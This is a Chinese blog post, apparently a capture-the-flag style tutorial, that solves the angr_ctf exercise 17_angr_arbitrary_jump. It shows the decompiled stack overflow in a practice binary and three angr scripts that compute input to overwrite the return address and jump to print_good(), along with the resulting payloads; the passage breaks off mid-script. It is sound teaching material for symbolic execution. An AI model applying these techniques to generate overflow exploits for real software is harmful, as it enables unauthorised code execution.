---
title: 17_angr_arbitrary_jump的简单解
url: https://mp.weixin.qq.com/s?__biz=MzUzMjQyMDE3Ng==&mid=2247487783&idx=1&sn=abf3096390a1cf2deaa63b168e08c808&chksm=fab2d218cdc55b0ed065fb31615626aba11eb99346b10201aa5424a6b5ddbad2d6c4a6b3fcfd&scene=58&subscene=0#rd
source: 青衣十三楼飞花堂
date: 2024-12-06
fetch_date: 2025-10-06T19:39:12.380532
---

# 17_angr_arbitrary_jump的简单解

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/VbJOzZqovPOWChjxIt82PzuodjCayk7RtMicqWQunVHPQXKYPaFD7hv2jfJel6Z64rfWCOgrmCmY2PrzALpsVGQ/0?wx_fmt=jpeg)

# 17\_angr\_arbitrary\_jump的简单解

原创

沈沉舟

青衣十三楼飞花堂

```
创建: 2024-12-05 10:32
更新: 2024-12-05 17:21
https://scz.617.cn/unix/202412051032.txt

目录:

    ☆ 背景介绍
    ☆ 17_angr_arbitrary_jump
    ☆ angr_solver_17_a.py (原始解)
    ☆ angr_solver_17_b.py (简单解)
    ☆ angr_solver_17_c.py (优化解)
```

☆ 背景介绍

参看

```
https://github.com/angr/angr

angr documentation
https://docs.angr.io/en/latest/

https://github.com/jakespringer/angr_ctf

https://github.com/jakespringer/angr_ctf/blob/master/SymbolicExecution.pptx
```

angr是一套「符号执行」框架，angr\_ctf是一堆angr练习题。初次接触angr的人，可先安装angr，过一遍SymbolicExecution.pptx，挨个做angr\_ctf，最后再回看pptx，否则太抽象。

angr的API随版本变化，本文所用版本

```
$ pip3 show angr | grep Version
Version: 9.2.125.dev0
```

参看

```
https://github.com/jakespringer/angr_ctf/blob/master/dist/17_angr_arbitrary_jump
https://github.com/jakespringer/angr_ctf/blob/master/solutions/17_angr_arbitrary_jump/solve17.py
```

17\_angr\_arbitrary\_jump是angr\_ctf最后一题，ELF有个栈溢出，不是让你IDA、GDB调这个栈溢出，是让你用angr自动求解，得到一个字符串，提供给ELF时，可有效控制RetAddr。

solve17.py中有段注释

Explore will not work for us, since the method specified with the find parameter will not be called on an unconstrained state.

solve17.py未使用sm.explore()，而是用sm.step()自己遍历。受此影响，误以为此题只能如此。

近日在渣浪说起angr\_example(另一堆练习题)中strcpy\_test的解坑了我一把，网友UID(3525972251)说他前段时间也被strcpy\_test坑过。看他在用angr，就给他另出了道小题，意外从他那儿看到17\_angr\_arbitrary\_jump的简单解。我很受启发，之前受solve17.py影响，思维定势了。

本文不做angr科普，直接给代码，假设读者已angr入门。

☆ 17\_angr\_arbitrary\_jump

这是目标ELF，IDA32反汇编17\_angr\_arbitrary\_jump

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
    printf("Enter the password: ");
    read_input();
    puts("Try again.");
    return 0;
}

int read_input()
{
    char v1[32];

    /*
     * 栈溢出
     */
    return __isoc99_scanf("%s", v1);
}

/*
 * 希望控制栈溢出RetAddr，使之指向print_good()
 */
void __noreturn print_good()
{
    puts("Good Job.");
    exit(0);
}
```

---

```
42585269                             read_input proc near
42585269
42585269                             var_20= byte ptr -20h
42585269
42585269                             ; __unwind {
42585269 000 55                          push    ebp
4258526A 004 89 E5                       mov     ebp, esp
4258526C 004 83 EC 48                    sub     esp, 48h
4258526F 04C 83 EC 08                    sub     esp, 8
42585272 054 8D 45 E0                    lea     eax, [ebp+var_20]
42585275 054 50                          push    eax
42585276 058 68 50 53 58 42              push    offset format               ; "%s"
4258527B 05C E8 40 31 AC C5              call    ___isoc99_scanf
42585280 05C 83 C4 10                    add     esp, 10h
42585283 04C 90                          nop
42585284 04C C9                          leave
42585285 000 C3                          retn
```

---

```
080483C0                         ___isoc99_scanf
42585249                         print_good
```

☆ angr\_solver\_17\_a.py (原始解)

原solve17.py无法直接用于新版angr，这是我修改过的原始解

```
$ python3 angr_solver_17_a.py 17_angr_arbitrary_jump
?@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@IRXB
```

主要就是"IRXB"，其余都无关紧要

```
$ echo -ne IRXB | xxd -g 1
00000000: 49 52 58 42                                      IRXB
```

本题精心安排print\_good()函数，使其地址本身对应可打印字符。

```
import sys, logging
import angr, claripy

def main ( argv ) :

    logging.getLogger( 'angr.engines.successors' ).setLevel( logging.ERROR )

    def is_print_good ( state ) :
        if state.solver.symbolic( state.regs.eip ) :
            #
            # 这是print_good()的地址
            #
            desire  = state.regs.eip == 0x42585249
            if state.satisfiable( extra_constraints=( desire, ) ) :
                state.add_constraints( desire )
                return True
            else :
                return False
        else :
            return False

    proj        = angr.Project( argv[1], auto_load_libs=False )

    secret_size = 40
    secret      = claripy.BVS( 'secret', secret_size * 8 )
    secret      = claripy.Concat( *[secret] + [claripy.BVV( b'\n' )] )

    init_state  = proj.factory.entry_state(
        stdin       = angr.SimFileStream(
            name    = 'stdin',
            content = secret,
            has_end = True
        ),
        add_options = {
            angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
            angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS,
            angr.options.BYPASS_UNSUPPORTED_SYSCALL,
        }
    )

    for c in secret.chop( bits=8 )[:-1] :
        init_state.add_constraints( c >= 33, c <= 126 )

    sm          = proj.factory.simulation_manager(
        init_state,
        save_unconstrained  = True,
        stashes             = {
            'active'        : [init_state],
            'unconstrained' : [],
            'found'         : [],
        }
    )

    while ( sm.active or sm.unconstrained ) and ( not sm.found ) :
        for state in sm.unconstrained :
            sm.move( 'unconstrained', 'found', filter_func=is_print_good )
        sm.step()

    if sm.found :
        for state in sm.found :
            if isinstance( secret, claripy.ast.bv.BV ) :
                secret  = state.solver.eval( secret, cast_to=bytes ).decode( 'utf-8' )
                print( secret[0:-1] )

if "__main__" == __name__ :
    main( sys.argv )
```

☆ angr\_solver\_17\_b.py (简单解)

由UID(3525972251)提供简单解

```
$ python3 angr_solver_17_b.py 17_angr_arbitrary_jump
b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00IRXB'
echo -ne "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASVJYQg==" | base64 -d | ./17_angr_arbitrary_jump
```

可这样向scanf()输入不可打印字符，小技巧

```
import sys, base64
import angr

def main ( argv ) :

    def is_bad ( state ) :
        return b'Try again.' in state.posix.dumps( sys.stdout.fileno() )

    proj        = angr.Project( argv[1], auto_load_libs=False )
    init_state  = proj.factory.entry_state(
        add_options = {
            angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
            angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS,
            angr.options.BYPASS_UNSUPPORTED_SYSCALL,
        }
    )
    sm          = proj.factory.simulation_manager( init_state )
    #
    # 这是read_input的retn指令所在
    #
    stop_addr   = 0x42585285
    sm.explore( find=stop_addr, avoid=is_bad )
    if sm.found :
        for state in sm.found :
            #
            # 从栈中取RetAddr
            #
            RetAddr     = state.memory.load( state.regs.esp, 4, endness=proj.arch.memory_endness )
            desire      = RetAddr == 0x42585249
            state.add_constraints( desire )
            raw         = state.posix.dumps( sys.stdin.fileno() )[:40]
            print( raw )
            solution    = base64.b64encode( raw ).decode( 'utf-8' )
            print( 'echo -ne "%s" | base64 -d | ./%s' % ( solution, argv[1] ) )

if "__main__" == __name__ :
    main( sys.argv )
```

☆ angr\_solver\_17\_c.py (优化解)

简单解用到base64。假设必须向scanf()提供可打印字符，需对符号向量增加约束条件。

```
$ python3 angr_solver_17_c.py 17_angr_arbitrary_jump
????????????????????????????????????IRXB
```

---

```
import sys
import angr, claripy

def main ( argv ) :

    def is_bad ( state ) :
        return b'Try again.' in state.posix.dumps( sys.stdout.fileno() )

    proj        = angr.Project( argv[1], auto_load_libs=False )

    secret_size = 40
    secret      = claripy.BVS( 'secret', secret_size * 8 )
    secret      = claripy.Concat( *[secret] + [claripy.BVV( b'\n' )] )

    init_state  = proj.factory.entry_state(
        stdin       = angr.SimFileStream(
            name    = 'stdin',
            content = secret,
            has_end = True
        ),
        add_options = {
            angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
            angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS,
            angr.options.BYPASS_UNSUPPORTED_SYSCA...